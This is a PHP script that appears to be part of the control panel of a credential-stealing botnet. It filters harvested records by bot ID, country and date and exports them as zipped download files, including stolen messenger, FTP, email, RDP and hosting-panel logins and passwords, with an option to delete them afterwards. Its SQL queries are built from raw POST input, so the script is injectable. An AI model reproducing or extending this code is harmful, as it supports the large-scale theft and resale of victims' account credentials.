<?php
//adduid
$dir = str_replace('\\', '/', pathinfo(__FILE__, PATHINFO_DIRNAME));
$dir = str_replace('/scripts/logs', '/', $dir);
$dir = $dir . 'cache/download/';

if(empty($Cur['id']) && !empty($Cur['str'])){	if(file_exists('cache/dlf/' . $Cur['str'])) exit;
	file_put_contents('cache/dlf/' . $Cur['str'], true);
}else{	if(file_exists('cache/dlf/' . $Cur['id'])) exit;
	file_put_contents('cache/dlf/' . $Cur['id'], true);
}

if(isset($_POST['limit'])){
	$sql = '';

	if(!empty($_POST['prefix'])){		$sql .= '(prefix=\''.$_POST['prefix'].'\')';
	}

	if(!empty($_POST['uid'])){
		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(uid LIKE \''.$_POST['program'].'\')';
	}

	if(!empty($_POST['program'])){
		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(program=\''.$_POST['program'].'\')';
	}

	if(!empty($_POST['country'])){
		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(country=\''.$_POST['country'].'\')';
	}
    /*
	if(!empty($_POST['country'])){
		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(country=\''.$_POST['country'].'\')';
	}
    */
	if($_POST['status'] == 'nuls'){
		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(save=\'0\')';
	}elseif($_POST['status'] == '1'){		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(save!=\'0\')';
	}
	
	if(!empty($_POST['type'])){
		if(!empty($sql)) $sql .= ' AND ';
		$sql .= '(type=\''.$_POST['type'].'\')';
	}

	if(!empty($_POST['data1']) && !empty($_POST['data2'])){
		if($_POST['data1'] != 'ALL' && $_POST['data2'] != 'ALL'){			if(!empty($sql)) $sql .= ' AND ';
			if($_POST['data1'] == $_POST['data2']){				$sql .= '(post_date > \''.$_POST['data1'].' 00:00:00\')';
			}else{				if($_POST['data1'] == 'ALL'){					$sql .= '(post_date < \''.$_POST['data2'].' 23:59:59\')';
				}elseif($_POST['data2'] == 'ALL'){					$sql .= '(post_date > \''.$_POST['data1'].' 00:00:00\')';
				}else{					$sql .= '(post_date > \''.$_POST['data1'].' 00:00:00\') AND (post_date < \''.$_POST['data2'].' 23:59:59\')';
				}
			}
		}
	}

    if(!empty($sql)) $sql = 'WHERE ' . $sql;

	if(!empty($Cur['id'])){
		$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
		$filter->fields = json_decode(base64_decode($filter->fields));
		if($Cur['id'] == $filter->id){
			do{				$rand = mt_rand('1', '9999999');
				$count = $mysqli->query_name('SELECT COUNT(*) count FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
			}while($count != 0);

			if($_POST['limit'] == 'ALL'){
				$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql);
				$file_name = $dir . 'filter_' . encapsules($filter->name) . '_all_' . date('d.m.Y_G.i.s', time()) . '.txt';
			}else{
				$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql . ' LIMIT ' . $_POST['limit']);
				$file_name = $dir . 'filter_' . encapsules($filter->name) . '_limit-'.$_POST['limit'].'_' . date('d.m.Y_G.i.s', time()) . '.txt';
			}

			$var = '';

            if(!empty($_POST['adduid'])) $var = 'concat(prefix,uid),';
			foreach($filter->fields->name as $key => $item){				$var .= 'v' . $key . ',';
			}
			$var = preg_replace('~,$~', '', $var);

            $mysqli->db[0]->query('SELECT ' . $var . ' INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');

			if($_POST['delete'] == 'on'){
            	$mysqli->db[0]->real_query('DELETE FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
			}

			@unlink('cache/dlf/' . $Cur['id']);

			if(file_exists($file_name)){
				if(extension_loaded ('zip')){					$zip_name = str_replace('.txt', '.zip', $file_name);
					$zip = new ZipArchive;
					$res = $zip->open($zip_name, ZIPARCHIVE::OVERWRITE);
					if($res === TRUE){                		$zip->addFile($file_name, basename($file_name));
                		$zip->close();
                		unlink($file_name);
                		$file_name = $zip_name;
                	}
                }

				header( "Content-Disposition: attachment; filename=\"" . basename($file_name) . '"' );
				if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){					header( 'X-LIGHTTPD-send-file: ' . $file_name);
				}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){					header('X-Sendfile: ' . $file_name);
				}
			}else{				print('ERROR:FILE_NOT_FOUND');
			}

			exit;
		}else{			@unlink('cache/dlf/' . $Cur['id']);
		}
	}elseif(!empty($Cur['str'])){
		switch($Cur['str']){
			case 'messengers':
	        	$filter->id = 'messengers';
	        	$filter->name = 'messengers';
	        	$filter->fields->name[1] = 'UIN/Name';
	        	$filter->fields->name[2] = 'Пароль';
			break;

			case 'ftps':
	        	$filter->id = 'ftps';
	        	$filter->name = 'ftps';
	        	$filter->fields->name[1] = 'Сервер';
	        	$filter->fields->name[2] = 'Логин';
	        	$filter->fields->name[3] = 'Пароль';
			break;

			case 'emailprograms':
	        	$filter->id = 'emailprograms';
	        	$filter->name = 'emailprograms';
	        	$filter->fields->name[1] = 'Емаил';
	        	$filter->fields->name[2] = 'Пароль';
			break;

			case 'rdp':
	        	$filter->id = 'rdp';
	        	$filter->name = 'rdp';
	        	$filter->fields->name[1] = 'Сервер';
	        	$filter->fields->name[2] = 'Логин';
	        	$filter->fields->name[3] = 'Пароль';
			break;

			case 'panels':
				$filter->name = 'Хостинг Панели';
		        $filter->id = 'panels';
		        $filter->fields->name[1] = 'Линк';
		        $filter->fields->name[2] = 'Логин';
		        $filter->fields->name[3] = 'Пароль';
			break;
		}

        $var = '';
		foreach($filter->fields->name as $key => $item){
			$var .= 'v' . $key . ',';
		}
		$var = preg_replace('~,$~', '', $var);

		do{
			$rand = mt_rand('1', '9999999');
			$count = $mysqli->query_name('SELECT COUNT(*) count FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
		}while($count != 0);

		if($_POST['limit'] == 'ALL'){			$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql);
			$file_name = $dir . 'filter_' . encapsules($filter->name) . '_all_' . date('d.m.Y_G.i.s', time()) . '.txt';
		}else{			$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql . ' LIMIT ' . $_POST['limit']);
			$file_name = $dir . 'filter_' . encapsules($filter->name) . '_limit-'.$_POST['limit'].'_' . date('d.m.Y_G.i.s', time()) . '.txt';
		}

        $mysqli->db[0]->query('SELECT ' . $var . ' INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');

        if($_POST['delete'] == 'on'){        	$mysqli->db[0]->real_query('DELETE FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
        }

		@unlink('cache/dlf/' . $Cur['str']);

		if(file_exists($file_name)){			if(extension_loaded ('zip')){
				$zip_name = str_replace('.txt', '.zip', $file_name);
				$zip = new ZipArchive;
				$res = $zip->open($zip_name, ZIPARCHIVE::OVERWRITE);
				if($res === TRUE){					$zip->addFile($file_name, basename($file_name));
					$zip->close();
					unlink($file_name);
					$file_name = $zip_name;
				}
			}

			header( "Content-Disposition: attachment; filename=\"" . basename($file_name) . '"' );
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){				header( 'X-LIGHTTPD-send-file: ' . $file_name);
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){				header('X-Sendfile: ' . $file_name);
			}
		}else{			print('ERROR:FILE_NOT_FOUND');
		}

		exit;
	}
}

if(empty($Cur['id']) && !empty($Cur['str'])){	@unlink('cache/dlf/' . $Cur['str']);
}else{	@unlink('cache/dlf/' . $Cur['id']);
}

?>